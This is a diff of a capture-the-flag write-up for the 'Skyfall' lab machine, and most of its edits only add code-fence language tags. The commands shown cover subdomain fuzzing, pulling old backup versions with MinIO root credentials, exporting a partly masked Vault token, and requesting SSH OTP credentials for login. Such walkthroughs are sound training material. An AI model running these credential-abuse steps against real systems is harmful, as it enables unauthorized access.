@@ -50,7 +50,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ### FFUF
 
-```
+```bash
 ffuf -c -u http://skyfall.htb -H "Host: FUZZ.skyfall.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac -mc all
 
         /'___\  /'___\           /'___\       
@@ -184,21 +184,20 @@ With both `MINIO_ROOT_USER` and `MINIO_ROOT_PASSWORD` in hand, we can now access
 
 Proceed to create an alias for an S3-compatible service after installing the client.
 
-```
+```bash
 mc alias set myminio http://prd23-s3-backend.skyfall.htb MINIO_ROOT_USER MINIO_ROOT_PASSWORD
 ```
 
 Upon examining the content, versions, and archives for a while, I came across `home_backup.tar.gz` in the directory for `askyy`,which caught my attention. Use this command to download it:
 
-```
+```bash
 mc cp --recursive myminio/askyy/home_backup.tar.gz ./home_backup.tar.gz
 ```
 
 Since that file contained nothing helpful, I looked up its prior occurrence:
 
-```shell
-mc cp --vid VERSION_ID myminio/askyy/home_backup.tar.gz ./home_backup.tar.gz
-```
+<pre class="language-shell"><code class="lang-shell"><strong>mc cp --vid VERSION_ID myminio/askyy/home_backup.tar.gz ./home_backup.tar.gz
+</strong></code></pre>
 
 After extracting the versions, get the file:
 
@@ -208,7 +207,7 @@ After extracting the versions, get the file:
 
 Within it is a file containing the SSH private key (You won't be using this to get your user flag anytime soon)
 
-```
+```bash
 cat authorized_keys
  
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC24FBEJuuHCJgHVvqk00ceKA4RATo/nmTkgsz0S5k5qiAsccLTgoUt7qbld6MlpNDnIflgOZ/sQxiYd64U8W95udZyHchBKdYuBUqxU8tQ0iMH/YPsHDy4G1i2yPC9YeiZ6WXKwiNqctfsxQGhoRxZaieiKokmEga3RDYTgg9PeZu++HYU8B/umpTcphU81LmYtHxizwtQDFC/dlS+8+hOy7ms2ZUZsYFG9oGlXXCGogxnr0ANOaPIwDbGJn+RpFsFCqNhuiRsV+iwRtFkfOueHhx1EOWLrUIcTw0YIZMRZIL9FGJe9H7BEfeI4/GM2p2KiyJMSUhFsdVstbrxK+RnSzn/pEg/7BT7nd2miFzbLv391klD+Gbzs8MrmtkdlFbrSriq4/V34AP/P2mcnXyT5g6L21TLJyFNxOWtZ6TXrkhTRS4uZBBendkpg7hMffMun9W/yxvmFQORCY0IQ6UAKZlilVH9xId9bGl7mqm4cNISeHetfPwQ38jKOvJzQZk= askyy@skyfall
@@ -275,20 +274,20 @@ So, basically, Vault server receives an OTP request from an authenticated client
 
 Download that tool and set the environment varibles:
 
-```
+```bash
 export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
-export VAULT_TOKEN="hvs.*****************v4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE
+export VAULT_TOKEN="hvs.*****************v4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
 ```
 
 Verify that the token value is valid:
 
-```
+```bash
 ./vault login
 ```
 
 Credentials can be supplied to the login endpoint to fetch a new Vault token via this [method](https://developer.hashicorp.com/vault/tutorials/getting-started/getting-started-apis):
 
-<pre><code>curl \
+<pre class="language-bash"><code class="lang-bash">curl \
 --header "X-Vault-Token: $VAULT_TOKEN" \
 <strong>--request POST \
 </strong>--data '{"ip":"10.10.11.254", "username":"askyy"}' \
@@ -299,7 +298,7 @@ $VAULT_ADDR/v1/ssh/creds/dev_otp_key_role
 
 Then, log in with:
 
-```
+```bash
 ./vault ssh -role dev_otp_key_role -mode otp askyy@skyfall.htb
 ```
 
